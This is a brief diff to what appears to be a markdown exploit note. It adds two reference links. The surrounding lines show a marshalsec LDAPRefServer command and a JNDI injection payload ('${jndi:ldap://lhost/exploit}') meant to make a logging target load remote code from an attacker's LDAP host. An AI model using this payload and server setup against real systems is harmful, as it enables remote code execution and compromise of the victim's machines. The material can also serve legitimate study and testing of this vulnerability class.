@@ -14,3 +14,8 @@ java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://
 insert log ${jndi:ldap://lhost/exploit}
 
 ```
+
+# Reference
+
+https://cloud.tencent.com/developer/article/1653754
+https://www.freebuf.com/vuls/208339.html
